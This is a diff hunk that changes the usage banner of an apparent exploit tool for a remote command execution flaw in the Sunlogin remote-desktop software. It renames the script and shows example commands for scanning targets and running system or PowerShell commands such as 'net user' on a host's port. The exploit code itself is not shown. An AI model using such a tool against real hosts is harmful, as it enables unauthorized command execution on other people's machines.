@@ -150,16 +150,16 @@ def title():
     ===================================================================
                         向日葵远程命令执行漏洞  By Lem
     ===================================================================
-                    Scan usage = "Usage: python exp.py \n"
+                    Scan usage = "Usage: python sunlogin-rce-scan.py \n"
                     EG:'targetsfile = 'targets.txt'  
                         'resultfile = 'result.txt'  \n'
     ===================================================================
     RCE CMD usage =
     "Usage: python sunlogin-rce-scan.py -a [--host] -p [port] -c [--command]\n"
-    eg:'python exp.py -a 127.0.0.1 -p 59527 -c "net user"\n'
+    eg:'python sunlogin-rce-scan.py -a 127.0.0.1 -p 59527 -c "net user"\n'
     RCE PowerShell usage =
     "Usage: python sunlogin-rce-scan.py -a [--host] -p [port] -s [--pws]\n"
-    eg:'python exp.py -a 127.0.0.1 -p 59527 -s "net user"\n'
+    eg:'python sunlogin-rce-scan.py -a 127.0.0.1 -p 59527 -s "net user"\n'
     ===================================================================
     """)
 
